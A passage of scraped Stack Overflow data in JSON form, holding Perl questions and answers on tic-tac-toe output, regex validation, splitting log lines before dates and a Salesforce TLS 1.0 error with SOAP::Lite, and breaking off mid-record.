   }\n        else {\n            push @usedOMoves, $move;\n        }\n\n        if ( CheckWin() ) {\n            return 1;\n        }\n\n        #SwitchPlayer();\n    }\n\n    return 0;\n}\n\n# Updates the current player\nsub SwitchPlayer {\n    if ( \"X\" eq $player ) {\n        $player = \"O\";\n    }\n    else {\n        $player = \"X\";\n    }\n}\n\n# Checks current moves against winning conditions\nsub CheckWin {\n\n    my @moves = [];\n\n    if ( \"X\" eq $player ) {\n        @moves = @usedXMoves;\n    }\n    else {\n        @moves = @usedOMoves;\n    }\n\n    return (\n           GetRow( \"Top\", @moves )\n        or GetRow( \"MidH\",   @moves )\n        or GetRow( \"Bottom\", @moves )\n        or GetRow( \"Left\",   @moves )\n        or GetRow( \"MidV\",   @moves )\n        or GetRow( \"Right\",  @moves )\n        or GetRow( \"DiaTB\",  @moves )\n        or GetRow( \"DiaBT\",  @moves )\n    );\n}\n\n# Returns true if the passed in array contains all the values for a given row\n\nsub GetRow {\n    my $row   = shift;\n    my @moves = @_;\n\n    # Convert array to map\n    my %moves = map { $_ =&gt; 1 } @moves;\n\n    my @indsToCheck = @{ $indsToCheck{$row} };\n\n    foreach ( @indsToCheck ) {\n        if ( !exists( $moves{$_} ) ) {\n            return FALSE;\n        }\n    }\n\n    $winningMove = $row;\n\n    return TRUE;\n}\n</code></pre>\n\n<p>With a board of:  </p>\n\n<pre><code>X|X|X\nO|X|_\nO|_|O\n</code></pre>\n\n<p>This outputs:  </p>\n\n<pre><code>X  \n|  \nX  \n|  \nX  \n...\n</code></pre>\n\n<p>So how do I print without newlines during a loop?</p>\n"}, {"tags": ["regex", "perl"], "answers": [{"comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494595806, "post_id": 43938808, "comment_id": 74910077, "body": "Your check will succeed if the string also has a newline at the end in addition to the specified characters. It may or may not be acceptable to let that slip."}, {"owner": {"reputation": 2783, "user_id": 782570, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cbbf87d7ce9ed596faa7e64231114991?s=128&d=identicon&r=PG&f=1", "display_name": "giusti", "link": "https://stackoverflow.com/users/782570/giusti"}, "edited": false, "score": 0, "creation_date": 1494596019, "post_id": 43938808, "comment_id": 74910236, "body": "Word is more than letters, so <code>\\w</code> will match digits and underscore. OP probably wants to keep <code>[a-zA-Z]+</code> there."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 2, "last_activity_date": 1494599300, "last_edit_date": 1494599300, "creation_date": 1494595312, "answer_id": 43938808, "question_id": 43938792, "link": "https://stackoverflow.com/questions/43938792/how-to-check-if-string-compliant-exact-pattern-using-regex-in-perl/43938808#43938808", "title": "How to check if string compliant exact pattern using regex in Perl", "body": "<p>You need a <code>+</code> after your <code>[a-zA-Z]</code> because there's 3 characters, not 1. And the same for your other character class. Otherwise they match just one letter/just one number. </p>\n\n<pre><code>if ($content =~/^[a-zA-Z]+[-][0-9 :a-zA-Z]+$/){\n</code></pre>\n\n<p>Will return '1'. </p>\n\n<p>But that's still not quite right, because you're matching '1 or more letters from practically anything, which isn't what you're after. So I'd probably:</p>\n\n<pre><code>/^[A-Z]+-\\d+:/i\n</code></pre>\n\n<p>Which matches 'word'-'digit' a start of line followed by colon, and lets the 'message' be anything. </p>\n\n<p>Or you could capture it:</p>\n\n<pre><code>print verifyMsg(\"ABC-123:Sample message\");\n\nsub verifyMsg {\n\n   my ($content) = @_;\n   if ( my ( $msg_code, $message ) = $content =~ m/^([A-Z]+-\\d+):(.*)/i ) {\n      print \"$msg_code $message\\n\";\n      return 1;\n   }\n   else {\n      return 0;\n   }\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1494595684, "post_id": 43938886, "comment_id": 74909984, "body": "The last character class in the example also includes a space."}, {"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1494595718, "post_id": 43938886, "comment_id": 74910017, "body": "@Sobrique: Yes, but the requirements do not mention that. It is written <i>any letter or number</i>."}, {"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494595851, "post_id": 43938886, "comment_id": 74910112, "body": "@Sinan&#220;n&#252;r: No longer, I replaced <code>$</code> with the <code>\\z</code> anchor."}, {"owner": {"reputation": 3559, "user_id": 4318982, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/f43ul.jpg?s=128&g=1", "display_name": "gihan-maduranga", "link": "https://stackoverflow.com/users/4318982/gihan-maduranga"}, "edited": false, "score": 0, "creation_date": 1494596668, "post_id": 43938886, "comment_id": 74910664, "body": "@WiktorStribi\u017cew the above regex didnt work when i put into my code but your previous pattern worked. <code>~&#47;^[a-zA-Z]+-[0-9]+:[A-Za-z0-9\\s]+$&#47;</code>"}, {"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "reply_to_user": {"reputation": 3559, "user_id": 4318982, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/f43ul.jpg?s=128&g=1", "display_name": "gihan-maduranga", "link": "https://stackoverflow.com/users/4318982/gihan-maduranga"}, "edited": false, "score": 0, "creation_date": 1494596719, "post_id": 43938886, "comment_id": 74910706, "body": "@gihan: Ok, I have reverted the whitespace pattern."}, {"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "reply_to_user": {"reputation": 3559, "user_id": 4318982, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/f43ul.jpg?s=128&g=1", "display_name": "gihan-maduranga", "link": "https://stackoverflow.com/users/4318982/gihan-maduranga"}, "edited": false, "score": 0, "creation_date": 1494606436, "post_id": 43938886, "comment_id": 74917316, "body": "@gihan: My answer got downvoted for some reason. Maybe because of the <code>\\s</code> that worked for you. Does replacing <code>\\s</code> with <code>\\h</code> (horizontal whitespace) work for you? Like <code>\\A[a-zA-Z]+-[0-9]+:[A-Za-z0-9\\h]+\\z</code>?"}, {"owner": {"reputation": 3559, "user_id": 4318982, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/f43ul.jpg?s=128&g=1", "display_name": "gihan-maduranga", "link": "https://stackoverflow.com/users/4318982/gihan-maduranga"}, "edited": false, "score": 1, "creation_date": 1494659885, "post_id": 43938886, "comment_id": 74932693, "body": "@WiktorStribi\u017cew replacing with <code>\\s</code> with <code>\\h</code> works fine. here is the regex <code>[a-zA-Z]+-[0-9]+:[A-Za-z0-9\\h]</code>"}], "tags": [], "owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "is_accepted": true, "score": 3, "last_activity_date": 1494668133, "last_edit_date": 1494668133, "creation_date": 1494595572, "answer_id": 43938886, "question_id": 43938792, "link": "https://stackoverflow.com/questions/43938792/how-to-check-if-string-compliant-exact-pattern-using-regex-in-perl/43938886#43938886", "title": "How to check if string compliant exact pattern using regex in Perl", "body": "<blockquote>\n  <p>Rule [any letter] [-] [any number] [:] [any letter or number]</p>\n</blockquote>\n\n<p>However, the input string provided in the question also contains a whitespace. So, according to that formula and the input string, you need</p>\n\n<pre><code>/\\A[a-zA-Z]+-[0-9]+:[A-Za-z0-9\\h]+\\z/\n</code></pre>\n\n<p><strong>Details</strong>:</p>\n\n<ul>\n<li><code>\\A</code> - start of string</li>\n<li><code>[a-zA-Z]+</code> - 1 or more (due to the <code>+</code> quantifier) ASCII letters</li>\n<li><code>-</code> - a hyphen</li>\n<li><code>[0-9]+</code> - 1 or more digits</li>\n<li><code>:</code> - a colon</li>\n<li><code>[A-Za-z0-9\\h]+</code>  - 1 or more alphanumeric chars and <em>horizontal</em> whitespaces (NOTE: if you allow any kind of whitespace teplace <code>\\h</code> with <code>\\s</code>. If you only allow regular soaces, keep the space as in the original pattern.)</li>\n<li><code>\\z</code> - the very end of string.</li>\n</ul>\n\n<p>See the <a href=\"https://ideone.com/oWSbyR\" rel=\"nofollow noreferrer\">Perl demo online with this regex</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": false, "score": 1, "last_activity_date": 1494597546, "last_edit_date": 1494597546, "creation_date": 1494596079, "answer_id": 43939088, "question_id": 43938792, "link": "https://stackoverflow.com/questions/43938792/how-to-check-if-string-compliant-exact-pattern-using-regex-in-perl/43939088#43939088", "title": "How to check if string compliant exact pattern using regex in Perl", "body": "<p>In scalar context <code>m//</code> returns true if it succeeds, false if it fails. By adding <code>0</code>, we coerce those to be 1 and 0, respectively. </p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nuse Test::More;\n\nwhile (my $case = &lt;DATA&gt;) {\n    last unless $case =~ /\\S/;\n    my ($msg, $expected) = split '\\s+=&gt;\\s+', $case, 2;\n    ok(verify_message($msg) == $expected, $msg);\n}\n\ndone_testing;\n\nsub verify_message {\n    0 + (\n        $_[0] =~ m{\n            ^                  # beginning of the string\n            [A-Za-z]+        - # alphabetic part of identifier\n            [0-9]+           : # numeric part of identifier\n            [A-Za-z0-9]+       # alphanumeric sequence\n            ([ ][A-Za-z0-9]+)* # possibly more alphanumeric sequences, space separated\n            \\z\n        }x\n    );\n}\n\n__DATA__\nABC-123:Sample message =&gt; 1\n123-ABC:Sample message =&gt; 0\nABC-123:1 2 3 4 5 6 7  =&gt; 1\nabc-123:Call 5551212   =&gt; 1\n</code></pre>\n\n<p>Output:</p>\n\n<pre>ok 1 - ABC-123:Sample message\nok 2 - 123-ABC:Sample message\nok 3 - ABC-123:1 2 3 4 5 6 7\nok 4 - abc-123:Call 5551212\n1..4</pre>\n\n<h3>Notes:</h3>\n\n<p><code>$</code> will match an optional newline at the end of the string. By using <code>\\z</code> to refer explicitly to the end of the string, I avoid accidentally letting a newline slip. Sometimes it is OK to let them through, sometimes they may lead to unexpected consequences later, so I recommend disallowing them unless they are explicitly allowed.</p>\n\n<p>You can add more and play with the test cases to see if the specification is complete: For example, test 4 would have failed if there had been dash in the phone number.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 7641463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e87adf3d545b529f75303413f3df346?s=128&d=identicon&r=PG&f=1", "display_name": "Yoganathan Ramu", "link": "https://stackoverflow.com/users/7641463/yoganathan-ramu"}, "is_accepted": false, "score": 0, "last_activity_date": 1494832473, "last_edit_date": 1494832473, "creation_date": 1494600224, "answer_id": 43940506, "question_id": 43938792, "link": "https://stackoverflow.com/questions/43938792/how-to-check-if-string-compliant-exact-pattern-using-regex-in-perl/43940506#43940506", "title": "How to check if string compliant exact pattern using regex in Perl", "body": "<p>try this:</p>\n\n<pre><code>print verifyMsg(\"ABC-123:Sample message\");\n\nsub verifyMsg{\n\n    my ($content )= @_;\n    print\"$content\\n\";\n    if ($content =~/^[a-z]+-\\d+\\:[\\w\\s+]+$/i){\n       return 1;\n    }\n    else{\n      return 0;\n   }\n\n }\n</code></pre>\n"}], "owner": {"reputation": 3559, "user_id": 4318982, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/f43ul.jpg?s=128&g=1", "display_name": "gihan-maduranga", "link": "https://stackoverflow.com/users/4318982/gihan-maduranga"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 292, "favorite_count": 0, "accepted_answer_id": 43938886, "answer_count": 4, "score": 2, "last_activity_date": 1494832473, "creation_date": 1494595274, "question_id": 43938792, "link": "https://stackoverflow.com/questions/43938792/how-to-check-if-string-compliant-exact-pattern-using-regex-in-perl", "title": "How to check if string compliant exact pattern using regex in Perl", "body": "<p>How to check if any text compliant to following rule.</p>\n\n<p><strong>Rule [any letter] [-] [any number] [:] [any letter or number]</strong></p>\n\n<p>eg:<code>ABC-123:Sample message</code></p>\n\n<p><strong>Perl Code Snippet</strong></p>\n\n<pre><code>print verifyMsg(\"ABC-123:Sample message\");\n\nsub verifyMsg{\n\n    my ($content) = @_;\n    if ($content =~/^[a-zA-Z][-][0-9 :a-zA-Z]$/){\n        return 1;\n    }else{\n        return 0;\n    }\n\n}\n</code></pre>\n\n<p>It always returns 0.Please let me know how to get it working.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1494589560, "post_id": 43937023, "comment_id": 74905945, "body": "By writing code."}, {"owner": {"reputation": 1, "user_id": 7469637, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a13582880e03099890a401b9edaed56?s=128&d=identicon&r=PG&f=1", "display_name": "Vimal Raj", "link": "https://stackoverflow.com/users/7469637/vimal-raj"}, "edited": false, "score": 0, "creation_date": 1494589913, "post_id": 43937023, "comment_id": 74906155, "body": "Tried with split with dot for now but im trying regex as well @words1 = split /\\./, $str;"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1494590753, "post_id": 43937023, "comment_id": 74906694, "body": "Edit your question to add the code that you have tried."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 7469637, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a13582880e03099890a401b9edaed56?s=128&d=identicon&r=PG&f=1", "display_name": "Vimal Raj", "link": "https://stackoverflow.com/users/7469637/vimal-raj"}, "edited": false, "score": 0, "creation_date": 1494591226, "post_id": 43937429, "comment_id": 74906983, "body": "I tried my @words1 = split /\\d{2}\\\\\\d{2}\\&#40;?:\\d{2}|\\d{4})\\s+\\d{2}:\\d{2}/, $str; but it did not return with desired output."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 1, "user_id": 7469637, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a13582880e03099890a401b9edaed56?s=128&d=identicon&r=PG&f=1", "display_name": "Vimal Raj", "link": "https://stackoverflow.com/users/7469637/vimal-raj"}, "edited": false, "score": 0, "creation_date": 1494592082, "post_id": 43937429, "comment_id": 74907604, "body": "@VimalRaj: That&#39;s not what I wrote"}, {"owner": {"reputation": 1, "user_id": 7469637, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a13582880e03099890a401b9edaed56?s=128&d=identicon&r=PG&f=1", "display_name": "Vimal Raj", "link": "https://stackoverflow.com/users/7469637/vimal-raj"}, "edited": false, "score": 0, "creation_date": 1494592216, "post_id": 43937429, "comment_id": 74907698, "body": "Thanks for your help @Borodin. I have mentioned what I have tried earlier. Your code piece worked."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 1, "last_activity_date": 1494590934, "creation_date": 1494590934, "answer_id": 43937429, "question_id": 43937023, "link": "https://stackoverflow.com/questions/43937023/how-to-split-a-string-and-add-new-line-before-date/43937429#43937429", "title": "How to split a string and add new line before date", "body": "<p></p>\n\n<p>It's not very good form to bring just a requirement to Stack Overflow without obviously having tried to solve the problem yourself. Without any code there is nothing to \"help\" with, and I hope you'll at least make an effort in the future</p>\n\n<p>Assuming there is always some whitespace before each date, this will work for you</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\nuse feature 'say';\n\nmy $string = '4/25/2011 11:34:07 AM [test] &gt;&gt; Need to change.  5/16/2011 10:44:45 AM [test] &gt;&gt; Nothing to change yet. Need to review information.  5/23/2011 11:13:39 AM [test] &gt;&gt; Working on it.';\n\n$string =~ s|\\s+(?=\\d{1,2}/\\d{1,2}/\\d{4})|\\n|g;\n\nsay $string;\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>4/25/2011 11:34:07 AM [test] &gt;&gt; Need to change.\n5/16/2011 10:44:45 AM [test] &gt;&gt; Nothing to change yet. Need to review information.\n5/23/2011 11:13:39 AM [test] &gt;&gt; Working on it.\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "edited": false, "score": 0, "creation_date": 1494832743, "post_id": 43941739, "comment_id": 74976735, "body": "No need to use <code>is</code> flag for this situation."}], "tags": [], "owner": {"reputation": 1, "user_id": 7641463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e87adf3d545b529f75303413f3df346?s=128&d=identicon&r=PG&f=1", "display_name": "Yoganathan Ramu", "link": "https://stackoverflow.com/users/7641463/yoganathan-ramu"}, "is_accepted": false, "score": -1, "last_activity_date": 1494832540, "last_edit_date": 1494832540, "creation_date": 1494603948, "answer_id": 43941739, "question_id": 43937023, "link": "https://stackoverflow.com/questions/43937023/how-to-split-a-string-and-add-new-line-before-date/43941739#43941739", "title": "How to split a string and add new line before date", "body": "<p>Try this:</p>\n\n<pre><code>my $string = \"4/25/2011 11:34:07 AM [test] &gt;&gt; Need to change.  5/16/2011 10:44:45 AM [test] &gt;&gt; Nothing to change yet. Need to review information.  5/23/2011 11:13:39 AM [test] &gt;&gt; Working on it.\";\n\n$string=~s/\\b(\\d{1,2}\\/\\d{1,2}\\/\\d{4})/\\n$1/igs;\n\n$string=~s/^\\s*//igs;\n\nprint\"$string\\n\";`\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 7469637, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a13582880e03099890a401b9edaed56?s=128&d=identicon&r=PG&f=1", "display_name": "Vimal Raj", "link": "https://stackoverflow.com/users/7469637/vimal-raj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 57, "favorite_count": 0, "accepted_answer_id": 43937429, "answer_count": 2, "score": -7, "last_activity_date": 1494832540, "creation_date": 1494589507, "last_edit_date": 1494592227, "question_id": 43937023, "link": "https://stackoverflow.com/questions/43937023/how-to-split-a-string-and-add-new-line-before-date", "title": "How to split a string and add new line before date", "body": "<p>How to split a string and add new line before date?</p>\n\n<p>For Ex, </p>\n\n<pre><code>$string = 4/25/2011 11:34:07 AM [test] &gt;&gt; Need to change.  5/16/2011 10:44:45 AM [test] &gt;&gt; Nothing to change yet. Need to review information.  5/23/2011 11:13:39 AM [test] &gt;&gt; Working on it.\n</code></pre>\n\n<p>Expected result:</p>\n\n<pre><code>4/25/2011 11:34:07 AM [test] &gt;&gt; Need to change.  \n5/16/2011 10:44:45 AM [test] &gt;&gt; Nothing to change yet. Need to review information.  \n5/23/2011 11:13:39 AM [test] &gt;&gt; Working on it.\n</code></pre>\n\n<p>I tried with </p>\n\n<pre><code>my @words1 = split /\\d{2}\\\\\\d{2}\\\\(?:\\d{2}|\\d{4})\\s+\\d{2}:\\d{2}/, $str;\n</code></pre>\n\n<p>But did not return with desired output</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1494590974, "post_id": 43936260, "comment_id": 74906817, "body": "You don&#39;t appear to have asked us a question. What are you trying to do? Where is your code?"}], "answers": [{"comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1494589547, "post_id": 43936639, "comment_id": 74905937, "body": "I will note that because <code>Crypt::SSLeay</code> depends on <code>LWP::Protocol::https</code>, upgrading it will automatically upgrade <code>LWP</code> and install <code>IO::Socket::SSL</code> and <code>Net::SSLeay</code>, and, unless the programmer engages in self-sabotage by manually overriding the defaults, <code>LWP</code> is going to use the recommended <code>Net::SSLeay</code> bindings to OpenSSL."}, {"owner": {"reputation": 11, "user_id": 7725658, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/0bce3b780686d40bf1b784a68128b9f0?s=128&d=identicon&r=PG&f=1", "display_name": "npandey", "link": "https://stackoverflow.com/users/7725658/npandey"}, "edited": false, "score": 0, "creation_date": 1494844016, "post_id": 43936639, "comment_id": 74983481, "body": "I am using RHEL5 where openssl version is 0.9.8. I have added the version 1.0.1 on my path and build the perl again. But still getting the same error.  Crypt::SSLeay version is latest one 0.72 in my perl installation."}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "reply_to_user": {"reputation": 11, "user_id": 7725658, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/0bce3b780686d40bf1b784a68128b9f0?s=128&d=identicon&r=PG&f=1", "display_name": "npandey", "link": "https://stackoverflow.com/users/7725658/npandey"}, "edited": false, "score": 0, "creation_date": 1494846645, "post_id": 43936639, "comment_id": 74985080, "body": "@npandey:I don&#39;t know what exactly you mean with &quot;added the version ... on my path&quot; but if it is just PATH then it is not sufficient. Also, you don&#39;t need to rebuild Perl but the Net::SSLeay module which is not part of Perl by default. See the README inside the Net::SSLeay distribution for a description on how to compile it with a specific openssl installation."}, {"owner": {"reputation": 11, "user_id": 7725658, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/0bce3b780686d40bf1b784a68128b9f0?s=128&d=identicon&r=PG&f=1", "display_name": "npandey", "link": "https://stackoverflow.com/users/7725658/npandey"}, "edited": false, "score": 0, "creation_date": 1494865515, "post_id": 43936639, "comment_id": 74998073, "body": "Many Thanks Steffen. It has been resolved after following your suggestions. Many thanks again"}], "tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": false, "score": 4, "last_activity_date": 1494589684, "last_edit_date": 1494589684, "creation_date": 1494588205, "answer_id": 43936639, "question_id": 43936260, "link": "https://stackoverflow.com/questions/43936260/why-i-am-getting-an-unsupported-client-message-when-i-try-to-connect-to-salesf/43936639#43936639", "title": "Why I am getting an &quot;unsupported client&quot; message when I try to connect to Salesforce using Perl&#39;s SOAP::Lite?", "body": "<p><a href=\"https://metacpan.org/pod/SOAP::Lite\" rel=\"nofollow noreferrer\">SOAP::Lite</a> is based on <a href=\"https://metacpan.org/pod/LWP\" rel=\"nofollow noreferrer\">LWP</a>. The https support in LWP is ultimately done by using the OpenSSL library. My guess is that you are using a very old OpenSSL library with no support for TLS 1.1 and TLS 1.2, typically either OpenSSL 0.9.8 or OpenSSL 1.0.0 since support for TLS 1.1 and TLS 1.2 was only added in OpenSSL 1.0.1. Such old OpenSSL libraries are typically installed on older systems but also on newer MacOS systems.</p>\n\n<p>To fix the problem you need to upgrade both OpenSSL and the Perl-bindings for it (<a href=\"https://metacpan.org/pod/Net::SSLeay\" rel=\"nofollow noreferrer\">Net::SSLeay</a> on newer systems or <a href=\"https://www.nu42.com/2014/08/dont-declare-dependency-on-cryptssleay.html\" rel=\"nofollow noreferrer\">Crypt::SSLeay</a> on older, depending on your version of LWP).</p>\n"}], "owner": {"reputation": 11, "user_id": 7725658, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/0bce3b780686d40bf1b784a68128b9f0?s=128&d=identicon&r=PG&f=1", "display_name": "npandey", "link": "https://stackoverflow.com/users/7725658/npandey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 258, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1494592782, "creation_date": 1494587064, "last_edit_date": 1494592782, "question_id": 43936260, "link": "https://stackoverflow.com/questions/43936260/why-i-am-getting-an-unsupported-client-message-when-i-try-to-connect-to-salesf", "title": "Why I am getting an &quot;unsupported client&quot; message when I try to connect to Salesforce using Perl&#39;s SOAP::Lite?", "body": "<blockquote>\n  <p>UNSUPPORTED_CLIENT: TLS 1.0 has been disabled in this organization. Please use TLS 1.1 or higher when connecting to Salesforce using https.</p>\n</blockquote>\n\n<p>I am using the <a href=\"https://metacpan.org/pod/SOAP::Lite\" rel=\"nofollow noreferrer\"><code>SOAP::Lite</code></a> module</p>\n"}, {"tags": ["xml", "perl", "perl-module"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1494586156, "post_id": 43935867, "comment_id": 74903710, "body": "Welcome to Stack Overflow and the Perl tag. I&#39;ve fixed the broken markup in the code in your question. Next time please reread your post before submitting it."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1494586285, "post_id": 43935867, "comment_id": 74903805, "body": "Your code has syntax errors. It&#39;s not clear if those are from copying it to the question or if they are there in your real code. You should <a href=\"https://stackoverflow.com/posts/43935867/edit\">edit</a> your question and include the actual code you are running, with the actual indentation and everything. To show code as code in Stack Overflow, select all of it and press ctrl + k on your keyboard or click the {} button above the editor. Please also show us an example of what <code>@cpuinfo</code> could contain, what the XML it generates now looks like and what kind of XML you are expecting."}, {"owner": {"reputation": 41, "user_id": 7455779, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/b34fa8607f1fec3463b5276299ac1fb9?s=128&d=identicon&r=PG&f=1", "display_name": "senor elanza", "link": "https://stackoverflow.com/users/7455779/senor-elanza"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": 